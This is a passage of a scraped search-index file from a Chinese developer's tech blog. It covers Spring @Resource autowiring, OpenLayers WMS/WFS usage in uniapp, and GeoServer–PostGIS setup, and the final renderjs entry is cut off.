①如果同时指定了name和type，则从Spring上下文中找到唯一匹配的bean进行装配，找不到则抛出异常。\n②如果指定了name，则从上下文中查找名称（id）匹配的bean进行装配，找不到则抛出异常。\n③如果指定了type，则从上下文中找到类似匹配的唯一bean进行装配，找不到或是找到多个，都会抛出异常。\n④如果既没有指定name，又没有指定type，则自动按照byName方式进行装配（当找不到与名称匹配的bean时才按照类型进行装配。但是需要注意的是，如果name属性一旦指定，就只会按照名称进行装配）；如果没有匹配，则回退为一个原始类型进行匹配，如果匹配则自动装配。\n推荐使用：@Resource注解在字段上，这样就不用写setter方法了，并且这个注解是属于J2EE的，减少了与spring的耦合。这样代码看起就比较优雅。\n针对不用写setter方法的理解，看下面\n1 2 3 4 5 6 7 8 //在Service层的实现类(UserServiceImpl)增加一个Set()方法 //利用set动态实现值的注入！ //DAO层并不写死固定调用哪一个UserDao的实现类 //而是通过Service层调用方法设置实现类！ private UserDao userDao; public void setUserDao(UserDao userDao){ this.userDao = userDao; } 1 ((UserServiceImpl)userService).setUserDao(new UserDaoImpl()); set方法中的参数为接口，传入的参数为接口的实现（类似代理模式）\n自己的理解：@Resource标注在ProjectService接口上，取属性名（projectService）进行装配，没有找到（@Service标注的ProjectServiceImpl默认名字是projectServiceImpl），再找相同类型的，找到ProjectServiceImpl（这里是通过多态的向上转型的方式判定ProjectServiceImpl和其接口的类型一样，所以虽然我们定义的属性是接口类型的，但是最终时候会装配到实现类上），实现自动装配\n参考文章：\nhttps://blog.csdn.net/weixin_40423597/article/details/80643990\nhttps://www.cnblogs.com/jichi/p/10073404.html\n","permalink":"https://chance7bin.github.io/posts/note/spring-%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D-%E6%8E%A5%E5%8F%A3/","summary":"在项目中遇到这么一个困惑 在controller层自动装配了一个service的接口 1 2 @Resource ProjectService projectService; ==为什么可以直接使用接口实现类重写的方法？==","title":"Spring 自动装配 接口"},{"content":"报错如下：\n1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ServiceExceptionReport version=\u0026#34;1.3.0\u0026#34; xmlns=\u0026#34;http://www.opengis.net/ogc\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.opengis.net/ogc http://fzzt.fzjhdn.com:10080/geoserver/schemas/wms/1.3.0/exceptions_1_3_0.xsd\u0026#34;\u0026gt; \u0026lt;ServiceException code=\u0026#34;LayerNotQueryable\u0026#34; locator=\u0026#34;QUERY_LAYERS\u0026#34;\u0026gt; Either no layer was queryable, or no layers were specified using QUERY_LAYERS \u0026lt;/ServiceException\u0026gt; \u0026lt;/ServiceExceptionReport\u0026gt; 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var view = map.getView(); var viewResolution = view.getResolution(); var source = requestLayer.getSource(); var url = source.getFeatureInfoUrl( evt.coordinate, viewResolution, view.getProjection(), { \u0026#39;INFO_FORMAT\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;FEATURE_COUNT\u0026#39;: 50 }); if (url) { console.log(\u0026#34;url:\u0026#34;,url) $.ajax({ url: url, type: \u0026#39;GET\u0026#39;, async: true, contentType: \u0026#39;application/json;charset=utf-8\u0026#39;, success: data =\u0026gt; { console.log(\u0026#34;data:\u0026#34;,data) console.log(\u0026#34;length:\u0026#34;,data.features.length) } }) } 解决方法：\n看了下官方文档，他说如果没有提供QUERY_LAYERS，那么将使用layers参数中指定的layers。\n之前用写死的图层做的时候是不需要提供这个的，但是改成动态添加图层之后没有这个就会报错，原因未知，那就只好加上这个了，无奈，只好在服务的json文件里再加上一个这个layer属性了\n","permalink":"https://chance7bin.github.io/posts/map/openlayers-wms%E7%82%B9%E5%87%BB%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99/","summary":"报错如下： 1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ServiceExceptionReport version=\u0026#34;1.3.0\u0026#34; xmlns=\u0026#34;http://www.opengis.net/ogc\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.opengis.net/ogc http://fzzt.fzjhdn.com:10080/geoserver/schemas/wms/1.3.0/exceptions_1_3_0.xsd\u0026#34;\u0026gt; \u0026lt;ServiceException code=\u0026#34;LayerNotQueryable\u0026#34; locator=\u0026#34;QUERY_LAYERS\u0026#34;\u0026gt; Either no layer was queryable, or no layers were specified using QUERY_LAYERS \u0026lt;/ServiceException\u0026gt; \u0026lt;/ServiceExceptionReport\u0026gt; 代码如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var view = map.getView(); var viewResolution =","title":"openlayers wms点击查询报错"},{"content":"1.地图无法加载出来的原因 在onLoad方法执行时，map还未渲染出来，无法操作map这个标签的dom，因此地图无法显示出来（也即在onLoad中调用loadMap打印第一行日志为null） 还有一个问题是script标签要加module\n\u0026lt;script module=\u0026quot;ol\u0026quot; lang=\u0026quot;renderjs\u0026quot;\u0026gt;\n2. openlayer坐标显示不匹配问题 须在view中对坐标系进行转换\n1 2 3 4 5 6 let view = new View({ center: fromLonLat([105, 34],\u0026#39;EPSG:3857\u0026#39;), zoom: 5, maxZoom: 18, minZoom: 1 }); 如果要素显示不出来，那么在url后面加上 srsname=EPSG:4326\n因为 view 设置的 projection: 'EPSG:4326' ，所以此处设置 srsname=EPSG:4326。\n3.postgis导入矢量数据时的SRID设置 SRID设置为多少的一个简便的查看方法是把需要导入的图层先通过geoserver的发布图层预发布，在发布图层的设置中，geoserver会自动的识别该矢量数据的SRS，即为postgis中导入矢量数据时设置的SRID，如果在导入postgis中不设置的话，可能会出现openlayers显示不出图层的问题。（SRID也可在pgAdmin中设置）\n4. uniapp ol样式无法引入文件 App平台 v3 模式暂不支持在 js 文件中引用\u0026quot;ol/ol.css\u0026quot; 请改在 style 内引用\n在App.vue中引入\n1 2 3 4 \u0026lt;style\u0026gt; /*每个页面公共css */ @import \u0026#39;/node_modules/ol/ol.css\u0026#39;; \u0026lt;/style\u0026gt; 5. openlayers加载自定义底图 天地图有7个服务节点，可以不固定使用其中一个节点的服务，而是使用 Math.round(Math.random()*7) 的方式随机决定从哪个节点请求服务，避免指定节点因故障等原因停止服务的风险。\n天地图会出现这个问题\n用高德底图\n6. 统计模块的开发 请求wfs服务获取所有要素的信息来进行统计模块的开发是不可行的\n使用 $.getJSON 以及 uni.request 都有请求大小的限制（当请求的数据过大时会出现 “unexpected EOF”），而且会把请求到的数据的每一个属性都请求下来，对于空间数据，其geom属性对于统计功能来说是没有必要的，由于线、面等数据是通过一个个点构成的，其geom含有大量点坐标信息，因此包含该属性的json数据相当大，若请求的数据较多，其json数据大小会远远超过$.getJSON 以及 uni.request 的限制，导致程序崩溃，因此考虑使用springboot连接postgis数据库，通过选择除了geom的其他字段来大大减小空间json数据的大小。\n7.分屏功能的开发 分屏\nopenlayers地图联动 图层不能共用\n地图渲染 要和页面渲染 同步 不然地图加载不出来\n地图渲染时机：设置延时加载\n创建的图层不能共用！！！ 必须new一个新的\n","permalink":"https://chance7bin.github.io/posts/map/openlayers-uniapp-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","summary":"1.地图无法加载出来的原因 在onLoad方法执行时，map还未渲染出来，无法操作map这个标签的dom，因此地图无法显示出来（也即在onLo","title":"openlayers uniapp 移动端开发问题汇总"},{"content":"1.加载在线WFS服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 \u0026lt;template\u0026gt; \u0026lt;view\u0026gt; \u0026lt;view id=\u0026#34;map\u0026#34; ref=\u0026#34;rootmap\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; \u0026lt;view style=\u0026#34;display: flex;\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;moveView\u0026#34;\u0026gt;moveView\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;fitToChengdu\u0026#34;\u0026gt;fitToChengdu\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script module=\u0026#34;ol\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; import \u0026#39;ol/ol.css\u0026#39;; import Map from \u0026#39;ol/Map\u0026#39;; import View from \u0026#39;ol/View\u0026#39;; import {Vector as VectorLayer,Tile as TileLayer} from \u0026#39;ol/layer\u0026#39;; import {Vector as VectorSource,OSM,XYZ} from \u0026#39;ol/source\u0026#39;; import {GeoJSON} from \u0026#39;ol/format\u0026#39;; import {bbox} from \u0026#39;ol/loadingstrategy\u0026#39; import {Style,Stroke,Circle,Fill} from \u0026#39;ol/style\u0026#39;; import {fromLonLat} from \u0026#39;ol/proj\u0026#39; var map = null export default { name: \u0026#39;OlWFS\u0026#39;, data() { return { }; }, onReady() { this.loadMap() }, methods:{ loadMap(){ //创建wfs资源 let wfsVectorSource = new VectorSource({ format: new GeoJSON(), projection: \u0026#39;EPSG:4326\u0026#39;, url: \u0026#39;/api/maptest/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Aqunaer_data_final\u0026amp;maxFeatures=500\u0026amp;outputFormat=application%2Fjson\u0026#39;, strategy: bbox }); let wfsVectorSourcePolygon = new VectorSource({ format: new GeoJSON(), projection: \u0026#39;EPSG:4326\u0026#39;, url: \u0026#39;/api/maptest/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Achina_province\u0026amp;maxFeatures=50\u0026amp;outputFormat=application%2Fjson\u0026#39;, strategy: bbox }); //创建wfs图层，注意需要设置好描边样式，否则不展示效果出来 let wfsVectorLayer = new VectorLayer({ source: wfsVectorSource, style: new Style({ image: new Circle({ radius: 5, fill: new Fill({ color: \u0026#34;#3885ff\u0026#34;, opacity: 0.5 }) }), stroke: new Stroke({ color: \u0026#39;blue\u0026#39;, width: 5 }) }), visible: true }); //view设置 let view = new View({ // center: fromLonLat([105, 34],\u0026#39;EPSG:3857\u0026#39;), center: [105, 34], zoom: 5, maxZoom: 18, minZoom: 5, projection: \u0026#39;EPSG:4326\u0026#39; });\t//创建一个map map = new Map({ layers: [ new TileLayer({ // source: new OSM() //这个会出现底图 source: new XYZ({ url: \u0026#39;http://{a-c}.tile.openstreetmap.org/{z}/{x}/{y}.png\u0026#39; }) }), wfsVectorLayer ], target: \u0026#34;map\u0026#34;, view: view }); map.on(\u0026#39;click\u0026#39;, function(evt) { console.log(\u0026#34;evt:\u0026#34;,evt.pixel) // displayFeatureInfo(evt.pixel); var feature = map.forEachFeatureAtPixel(evt.pixel, function(feature) { return feature; }); console.log(\u0026#34;feature:\u0026#34;,feature) if(feature != null){ console.log(\u0026#34;feature getId:\u0026#34;,feature.getId()) console.log(\u0026#34;feature getKeys:\u0026#34;,feature.getKeys()) console.log(\u0026#34;feature getProperties:\u0026#34;,feature.getProperties()) } }); }, // 向左移动地图 moveView(){ var view = map.getView(); var mapCenter = view.getCenter(); // 让地图中心的x值增加，即可使得地图向左移动，增加的值根据效果可自由设定 console.log(\u0026#34;mapCenter:\u0026#34;,mapCenter) mapCenter[0] += 50000; view.setCenter(mapCenter); map.render(); }, fitToChengdu() { // 让地图最大化完全地显示区域[104, 30.6, 104.12, 30.74] map.getView().fit([104, 30.6, 104.12, 30.74], map.getSize()); }, } }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; #map{ width: 100%; height: 90vh; } /*隐藏ol的一些自带元素*/ .ol-attribution, .ol-zoom { display: none; } \u0026lt;/style\u0026gt; 2.点击wfs要素展示数据 ==使用map.forEachFeatureAtPixel==\nhtml\n1 2 3 4 \u0026lt;div id=\u0026#34;popup\u0026#34; class=\u0026#34;ol-popup\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; id=\u0026#34;popup-closer\u0026#34; class=\u0026#34;ol-popup-closer\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div id=\u0026#34;popup-content\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 // 获取到popup的节点 var container = document.getElementById(\u0026#39;popup\u0026#39;); var content = document.getElementById(\u0026#39;popup-content\u0026#39;); var closer = document.getElementById(\u0026#39;popup-closer\u0026#39;); /** * Add a click handler to hide the popup. * @return {boolean} Don\u0026#39;t follow the href. */ closer.onclick = function () { overlay.setPosition(undefined); closer.blur(); return false; }; // 创建一个overlay, 绑定html元素container var overlay = new Overlay(/** @type {olx.OverlayOptions} */ ({ element: container, autoPan: true, autoPanAnimation: { duration: 250 } })); map.addOverlay(overlay) //点击要素获得信息 map.on(\u0026#39;singleclick\u0026#39;, function(evt) { // console.log(\u0026#34;evt:\u0026#34;,evt) // displayFeatureInfo(evt.pixel); var feature = map.forEachFeatureAtPixel(evt.pixel, function(feature) { return feature; }); console.log(\u0026#34;feature:\u0026#34;,feature) if(feature != null){ // console.log(\u0026#34;feature getId:\u0026#34;,feature.getId()) // console.log(\u0026#34;feature getKeys:\u0026#34;,feature.getKeys()) // console.log(\u0026#34;feature getProperties:\u0026#34;,feature.getProperties()) var prop = feature.getProperties(); if(feature.getId().indexOf(\u0026#34;qunaer\u0026#34;) != -1){ content.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + prop.F_name + \u0026#39;\u0026lt;/h3\u0026gt;\u0026#39; + \u0026#39;\u0026lt;p style=\u0026#34;margin:10px 0\u0026#34;\u0026gt;地址:\u0026#39; + prop.address + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39; + \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39; + prop.picurl + \u0026#39;\u0026#34; height=\u0026#34;150px\u0026#34; /\u0026gt;\u0026#39;; } else if(feature.getId().indexOf(\u0026#34;province\u0026#34;) != -1){ content.innerHTML = \u0026#39;\u0026lt;h2\u0026gt;\u0026#39; + prop.NL_NAME_1 + \u0026#39;\u0026lt;/h2\u0026gt;\u0026#39; } // 设置overlay的位置，从而显示在鼠标点击处 overlay.setPosition(evt.coordinate); } }); css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .ol-popup { position: absolute; background-color: white; box-shadow: 0 1px 4px rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; border: 1px solid #cccccc; bottom: 12px; left: -50px; min-width: 250px; } .ol-popup:after, .ol-popup:before { top: 100%; border: solid transparent; content: \u0026#34; \u0026#34;; height: 0; width: 0; position: absolute; pointer-events: none; } .ol-popup:after { border-top-color: white; border-width: 10px; left: 48px; margin-left: -10px; } .ol-popup:before { border-top-color: #cccccc; border-width: 11px; left: 48px; margin-left: -11px; } .ol-popup-closer { text-decoration: none; position: absolute; top: 2px; right: 8px; } .ol-popup-closer:after { content: \u0026#34;✖\u0026#34;; } 3.通过wfs修改数据 加载wfs的时候要指定geometryName\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 wfsVectorLayer = new VectorLayer({ source: new VectorSource({ format: new GeoJSON({ // 因为数据源里面字段the_geom存储的是geometry，所以需要指定 geometryName: \u0026#39;the_geom\u0026#39; }), url: \u0026#39;/api/wfs?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=maptest%3Anyc_roads\u0026amp;outputFormat=application%2Fjson\u0026amp;srsname=EPSG:4326\u0026#39; }), style: function(feature, resolution) { return new Style({ stroke: new Stroke({ color: \u0026#39;red\u0026#39;, width: 2 }) }); } }); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 // 保存已经编辑的要素 onSave() { if (modifiedFeatures \u0026amp;\u0026amp; modifiedFeatures.getLength() \u0026gt; 0) { console.log(\u0026#34;modifiedFeatures:\u0026#34;,modifiedFeatures) // 转换坐标 var modifiedFeature = modifiedFeatures.item(0).clone(); // 注意ID是必须，通过ID才能找到对应修改的feature modifiedFeature.setId(modifiedFeatures.item(0).getId()); // 调换经纬度坐标，以符合wfs协议中经纬度的位置 modifiedFeature.getGeometry().applyTransform(function(flatCoordinates, flatCoordinates2, stride) { for (var j = 0; j \u0026lt; flatCoordinates.length; j += stride) { var y = flatCoordinates[j]; var x = flatCoordinates[j + 1]; flatCoordinates[j] = x; flatCoordinates[j + 1] = y; } }); console.log(\u0026#34;modifyWfs:\u0026#34;,modifiedFeature) this.modifyWfs([modifiedFeature]); } }, // 把修改提交到服务器端 modifyWfs(features) { var WFSTSerializer = new WFS(); var featObject = WFSTSerializer.writeTransaction(null, features, null, { featureType: \u0026#39;nyc_roads\u0026#39;, // 注意这个值必须为创建工作区时的命名空间URI featureNS: \u0026#39;http://maptest/test1\u0026#39;, srsName: \u0026#39;EPSG:4326\u0026#39; }); // 转换为xml内容发送到服务器端 var serializer = new XMLSerializer(); var featString = serializer.serializeToString(featObject); console.log(\u0026#34;featString:\u0026#34;,featString) uni.request({ url: \u0026#39;/api/wfs?service=WFS\u0026#39;, method: \u0026#39;POST\u0026#39;, data:featString, header: { // 指定内容为xml类型 \u0026#39;Content-Type\u0026#39;: \u0026#39;text/xml\u0026#39; }, success: (res) =\u0026gt; { console.log(\u0026#34;success res:\u0026#34;,res.data); } }); } 4.加载WMS 点击wms获得信息 使用**==getFeatureInfoUrl==**\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 //加载WMS var wmsLayer = new TileLayer({ source: new TileWMS({ url: \u0026#34;/api/maptest/wms\u0026#34;, params:{ \u0026#39;LAYERS\u0026#39;: this.wmsSource, \u0026#39;TILED\u0026#39;: true }, transition: 0 //渲染时不透明度过渡的持续时间。要禁用不透明度转换 transition: 0 }) }); var view = new View({ projection: \u0026#34;EPSG:4326\u0026#34;, // center: [105, 34], center: [118.006954,25.101685], zoom: 10, maxZoom: 18, minZoom: 4, }) var map = new Map({ // layers: [tileOSM, tileLayer], layers: [tileOSM, wmsLayer, wfsVectorLayer], view: view, target: \u0026#39;map\u0026#39;, }); //点击wms获得信息 map.on(\u0026#39;singleclick\u0026#39;, function(evt) { // document.getElementById(\u0026#39;nodelist\u0026#39;).innerHTML = \u0026#34;Loading... please wait...\u0026#34;; var view = map.getView(); var viewResolution = view.getResolution(); var source = wmsLayer.getSource(); var url = source.getFeatureInfoUrl( evt.coordinate, viewResolution, view.getProjection(), { \u0026#39;INFO_FORMAT\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;FEATURE_COUNT\u0026#39;: 50 }); if (url) { // document.getElementById(\u0026#39;nodelist\u0026#39;).innerHTML = \u0026#39;\u0026lt;iframe seamless src=\u0026#34;\u0026#39; + url + \u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;; console.log(\u0026#34;url:\u0026#34;,url) } }); ","permalink":"https://chance7bin.github.io/posts/map/openlayers%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1.加载在线WFS服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59","title":"openlayers加载地图服务"},{"content":"1.官网API https://openlayers.org/en/latest/apidoc/\n2.openlayers教程（花几天时间从头看到尾基本上就可以熟悉openlayers了） http://primer.openlayers.cn/ol3-primer/\n3.GeoServer安装和发布服务 https://blog.csdn.net/u010166404/article/details/51115862?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control\u0026amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control\n4.PostgreSQL 10 和postgis10下载安装 https://blog.csdn.net/qq_40323256/article/details/101699490\n5.创建空间数据库 https://blog.csdn.net/qq_35732147/article/details/85226864\n6.加载空间数据 https://blog.csdn.net/qq_35732147/article/details/85228444\n7.利用GeoWebCache实现WebGIS地形图展示的缓存优化 https://www.cnblogs.com/naaoveGIS/p/4195008.html\n","permalink":"https://chance7bin.github.io/posts/map/%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/","summary":"1.官网API https://openlayers.org/en/latest/apidoc/ 2.openlayers教程（花几天时间从头看到尾基本上就可以熟悉openlayers了） http://primer.openlayers.cn/ol3-primer/ 3.GeoServer安装和发布","title":"参考资料"},{"content":"一、GeoServer安装和发布服务 参考链接\n二、PostgreSQL 和 PostGIS安装 PostGIS要下载和PostgreSQL对应版本！！！\n1.下载安装postgreSQL 进入PostgreSQL 官网，进入下载导航，点击windows系统，或直接打开如下网址：\nhttps://www.enterprisedb.com/downloads/postgres-postgresql-downloads\n下载好后，以管理员身份运行安装包，然后指定安装路径\n然后一路next\n（注意：可能会报错，不过没关系，点击取消就行）\n在程序里找到安装的PostgreSQL 10下面的pgAdmin4运行数据库管理工具\n​\n2.下载安装postgis 可使用Application Stack Builder进行下载，但速度比较慢，而且可能会卡死无响应，因此换一种可以直接下载.exe的方法。\n下载地址：http://download.osgeo.org/postgis/windows/\n==一定一定要先选择对应的PostgreSQL版本！！！==\n注意：上面的安装路径一定要选择postgresql的安装路径！！！切记\n一路next\n重新打开pgadmin，发现出现了postgis数据库了\n三、创建空间数据库 1.打开pgAdmin4，鼠标右击数据库选项并选择新建数据库：\n2.如下图所示，填写“新建数据库”表单，然后单击“确定”：\n**3.**选择nyc这个新建的数据库，并打开它以显示对象树，将会看到public架构（schema）：\n4. 单击下面所示的SQL查询按钮（或转到工具 \u0026gt; 查询工具）。\n5.在查询文本区域中输入以下查询语句以加载PostGIS****空间扩展：\nCREATE EXTENSION postgis;\n6.单击工具栏中的执行查询按钮（或按F5）以\u0026quot;执行查询\u0026quot;。\n**7.**现在，通过运行PostGIS函数来确认是否安装了PostGIS：\nSELECT postgis_full_version();\n至此，已经成功地创建了PostGIS空间数据库！\n四、加载空间数据（记得设置SRID） 1.首先，返回到选项板，并单击PostGIS部分中的PostGIS shapefile工具，PostGIS shapefile工具将启动。\n**2.**填写PostGIS连接部分的连接详细信息，然后单击“ok”按钮。程序将测试连接并在日志窗口中报告。\n如果安装时使用默认的信息，就如下所示：\n**3.**接下来，打开“Add File”按钮并导航到数据目录文件\n4.将文件的SRID（空间参考信息）值更改为4527（数据源的空间参考信息）。请注意，架构、表名和列名已经根据shapefile文件里的信息填充。\n5.单击\u0026quot;Options\u0026ldquo;按钮查看加载选项。加载程序将使用快速“COPY（复制）\u0026ldquo;模式，并在加载数据后默认创建空间索引。\n**6.**最后，单击\u0026rdquo;Import\u0026ldquo;按钮并观察导入过程。\n**7.**加载所有文件后，打开pgAdmin可以看到表已加载到数据库中：数据库\u0026gt;mySDE\u0026gt;架构\u0026gt;public\u0026gt;数据表里。\n五、GeoServer连接PostGIS 1.打开GeoServer，点击数据存储中的新建数据源，选择PostGIS\n2.选择工作区，连接参数中输入PostgreSQL端口号、数据库、用户名、密码，最后点击保存应用\n六、mapbox加载geoserver发布的瓦片服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;MapBox加载WMS地图服务\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.css\u0026#39; rel=\u0026#39;stylesheet\u0026#39; /\u0026gt; \u0026lt;style\u0026gt; body { margin:0; padding:0; } #map { position:absolute; top:0; bottom:0; width:100%; } /*隐藏logo*/ .mapboxgl-ctrl.mapboxgl-ctrl-attrib{ display: none !important; } .mapboxgl-ctrl-logo{ display: none !important; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#39;map\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script \u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXRzM2htdWxubDh1MzJrIn0.2e2_rdU2nOUvtwltBIZtZg\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, center: [108.438,34.431], zoom: 7 }); let wmsUrl = \u0026#34;http://localhost:8008/geoserver/mapserver/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=mapserver:bus_line\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#34; map.on(\u0026#34;load\u0026#34;,function () { map.addLayer({ \u0026#39;id\u0026#39;: \u0026#39;wms-test-layer\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;source\u0026#39;: { \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;tiles\u0026#39;: [ wmsUrl ], \u0026#39;tileSize\u0026#39;: 256 }, \u0026#39;paint\u0026#39;: {} }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注意\nEPSG要设置为3857而不是4326，不然会出现跨域问题\n","permalink":"https://chance7bin.github.io/posts/map/geoserver%E8%BF%9E%E6%8E%A5postgis%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"一、GeoServer安装和发布服务 参考链接 二、PostgreSQL 和 PostGIS安装 PostGIS要下载和PostgreSQL对应版本！","title":"geoserver连接postgis发布地图服务"},{"content":"renderjs是uni-app中一个运行在视图层的JS。可在App端和H5页面上运行。renderjs的主要作用有2个：\n（1）极大地减少了逻辑层（service）和视图层（view）的通讯损耗，提供高性能视图交互能力。纵然逻辑层和视图层分离的好处不容忽视，但例如Android端和小程序的高性能应用制作造成两层之间的通信阻塞迫使我们不得不放弃采用这种技术。由于renderjs运行在视图层，可以直接操作视图层的元素，因此可避免通信折损。\n（2）在视图层操作DOM，运行for web的JS库。官方文档中不建议在uni-app里操作DOM，但可使用renderjs来操作一些dom、window的库。原因在于在app-vue环境下，视图层由webview渲染，而renderjs运行在视图层，可以很方便地操作dom和window。\n移动端使用OpenLayers等开源GIS地图库最大的困难在于，若是没有提供相应的SDK将很难进行移动App的开发。由于uni-app不支持操作DOM元素，使得众多开源GIS地图库在开发移动应用时被舍弃。\n如今，有了renderjs技术后，可直接在视图层操作DOM元素，让开发者可以像开发WebGIS一样开发移动端GIS，这极大地降低了开发难度，开发者只需掌握Vue框架的核心内容，而无需掌握Android及IOS的开发技术便可实现移动GIS应用的大部分功能。\n如下为renderjs的使用方式，openlayers的写法跟开发WebGIS相同，写在script中\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script module=\u0026#34;test\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { mounted() { // ... }, methods: { // ... } } \u0026lt;/script\u0026gt; 当项目代码越来越多的时候，对代码进行组件化是必须的，网上针对renderjs组件之间通信的资料还比较少，官网给了一个较为简单的示例。\nhttps://ext.dcloud.net.cn/plugin?id=1207\n但是在实际开发中通信时遇到的一些情况网上并没有相关解答，所以我在这里做了总结并给出了相应的解决方案，供大家参考。\n1 renderjs通信示例及解析 HTML\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!-- 顶部导航栏 --\u0026gt; \u0026lt;view class=\u0026#34;top-nav\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;ol.queryFeature\u0026#34;\u0026gt;查询\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;!-- 查询菜单 --\u0026gt; \u0026lt;view class=\u0026#34;side-menu\u0026#34;\u0026gt; \u0026lt;scroll-view class=\u0026#34;feature-list\u0026#34; scroll-x=\u0026#34;true\u0026#34; scroll-y=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;!-- 